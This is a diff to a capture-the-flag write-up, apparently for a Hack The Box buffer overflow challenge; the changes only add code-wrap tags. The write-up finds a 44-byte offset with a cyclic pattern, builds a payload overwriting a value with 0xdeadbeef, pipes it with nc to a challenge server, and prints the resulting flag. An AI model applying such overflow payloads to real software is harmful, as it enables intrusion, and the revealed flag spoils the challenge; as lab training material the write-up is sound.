@@ -26,6 +26,7 @@ layout:
 
 Generate a cyclic pattern and send it to the program as input and check which bytes make it into the RIP, then unhex and find the offset.
 
+{% code overflow="wrap" %}
 ```bash
 cyclic 100
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
@@ -35,17 +36,21 @@ unhex 6161616c6161616b
 cyclic -l laaa
 44
 ```
+{% endcode %}
 
 Create a payload and send it to the server.
 
+{% code overflow="wrap" %}
 ```bash
 python2 -c 'print "A" * 44 + "\xef\xbe\xad\xde"' > payload
 
 nc 209.97.129.76 30115 < payload
 ```
+{% endcode %}
 
 Receive flag 🙂
 
+{% code overflow="wrap" %}
 ```bash
       [Addr]       |      [Value]
 -------------------+-------------------
@@ -62,3 +67,4 @@ Receive flag 🙂
 
 HTB{b0f_s33m5_3z_r1ght?}
 ```
+{% endcode %}
